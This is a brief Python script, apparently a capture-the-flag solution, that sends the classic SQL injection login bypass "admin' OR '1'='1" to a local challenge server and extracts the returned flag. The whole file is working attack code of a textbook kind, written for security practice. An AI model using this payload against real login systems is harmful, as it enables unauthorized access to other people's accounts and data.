#!/usr/bin/env python3
"""
Automated exploit for the SQL Injection challenge
"""

import requests
import sys

def exploit(target_url):
    """Exploit the SQL injection vulnerability"""
    
    # SQL injection payload to bypass authentication
    payload = {
        'username': "admin' OR '1'='1",
        'password': 'anything'
    }
    
    print(f"[*] Targeting: {target_url}")
    print(f"[*] Sending payload: {payload['username']}")
    
    try:
        response = requests.post(target_url, data=payload)
        
        if 'flag{' in response.text:
            # Extract flag from response
            flag_start = response.text.find('flag{')
            flag_end = response.text.find('}', flag_start) + 1
            flag = response.text[flag_start:flag_end]
            print(f"[+] Success! Flag: {flag}")
            return flag
        else:
            print("[-] Exploit failed or flag not found")
            return None
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:8080'
    exploit(target)
